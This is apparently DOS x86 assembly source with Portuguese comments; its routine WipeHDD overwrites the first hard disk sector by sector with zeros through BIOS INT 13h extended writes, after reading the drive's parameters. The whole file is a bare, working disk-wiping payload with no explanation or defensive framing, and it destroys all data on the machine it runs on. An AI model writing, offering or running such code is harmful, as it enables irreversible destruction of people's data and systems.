org 100h
CALL GetDiskPar
Start:
push es
mov eax,4000h
mov es,ax
es
cmp dword[10h],0
jle End1
call WipeHDD
mov eax,60H
ss
add dword[SETOR],eax
mov eax,60H
es
sub dword[10h],60H
pop es
jmp Start
End1:
ret
WipeHDD:
mov eax,0
mov ecx,3000H
push es
mov esi,4000h
mov es,si
mov edi,600h
rep stosd
pop es
mov al,10h
mov si,300h
mov al,10h
mov [si],al
mov al,0h
mov [si+1],al
mov al,60H
mov [si+2],al
mov al,0h
mov [si+3],al
mov ax,600h
mov [si+4],ax
mov ax,4000h
mov [si+6],ax
ss
mov eax,[SETOR]  ;SETOR A SER GRAVADO
mov [si+8],eax
xor ax,ax
mov [si+0ch],ax
mov [si+0eh],ax
mov ah,43h
mov dl,80h
INT 13h
ret
GetDiskPar:
mov ah,48h
mov dl,80h
push ds
mov bx,4000h
mov ds,bx
xor si,si
INT 13h
pop ds
ret
SECTOR_SIZE DW 0
SETOR DD 0
SECTOR2 DD 0
SPACES DD 0
